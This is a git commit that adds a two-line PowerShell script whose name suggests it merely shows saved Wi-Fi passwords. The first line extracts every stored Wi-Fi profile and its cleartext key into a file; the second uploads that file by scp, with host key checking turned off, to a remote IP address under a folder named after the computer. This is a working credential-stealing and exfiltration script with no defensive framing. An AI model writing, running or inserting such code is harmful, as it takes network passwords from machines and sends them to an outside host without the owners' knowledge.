ac1c1177296fdfca86fd09c7e1c8fc173d1e00e1
Nate Glaser <nate@wolf-paw.net>
2022-02-16 14:36:30 -0500

    wifi

---
+++ show-all-saved-wifi-passwords.ps1
@@ -0,0 +1,3 @@
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} >> asdf2.txt
+
+scp -o "StrictHostKeyChecking=no" -i ./asdf ./asdf2.txt nateg@147.182.151.141:/home/nateg/wifi/$env:computername
